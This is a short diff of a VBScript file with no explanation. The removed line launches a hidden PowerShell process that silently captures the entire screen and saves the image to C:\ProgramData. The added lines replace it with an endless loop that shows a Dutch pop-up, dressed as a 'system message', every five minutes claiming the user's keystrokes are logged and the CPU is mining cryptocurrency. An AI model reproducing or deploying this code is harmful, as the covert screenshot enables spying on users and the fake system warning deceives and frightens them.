@@ -1,1 +1,4 @@
-CreateObject("WScript.Shell").Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $s = [System.Windows.Forms.SystemInformation]::VirtualScreen; $b = New-Object System.Drawing.Bitmap($s.Width, $s.Height); $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.X, $s.Y, 0, 0, $b.Size); $b.Save('C:\ProgramData\screenshot.png'); $g.Dispose(); $b.Dispose()""", 0, False
+Do
+    MsgBox "Let op: Je toetsen worden vastgelegd en je CPU wordt gebruikt voor cryptomining.", 64, "Systeembericht"
+    WScript.Sleep 300000  ' 5 minuten = 300.000 milliseconden
+Loop
